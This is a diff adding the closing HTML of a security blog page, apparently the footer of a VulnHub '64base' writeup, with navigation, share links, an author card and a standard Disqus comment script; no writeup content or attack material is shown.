+                    aria-label="NEXT: TAMUctf 18"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a
+                        class="post-action-btn btn btn--default"
+                        href="#disqus_thread"
+                        aria-label="Leave a comment"
+                    >
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="2">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">Theo Chen</h4>
+        
+            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>Threat Researcher</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker-alt"></i>
+                <br/>
+                Taipei, Taiwan
+            </div>
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-ntjm1xxqdwr7uhkrlwal4hkgsjrprt8jr4d5cauo3fpjpjoa3nude4bnfikw.min.js"></script>
+
+<!--SCRIPTS END-->
+
+
+    
+        <script>
+          var disqus_config = function() {
+            this.page.url = 'https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-64base/';
+              
+            this.page.identifier = 'Writeups/VulnHub/VulnHub-64base/';
+              
+          };
+          (function() {
+            var d = document, s = d.createElement('script');
+            var disqus_shortname = 'theo-5';
+            s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+          })();
+        </script>
+    
+
+
+
+
+    </body>
+</html>
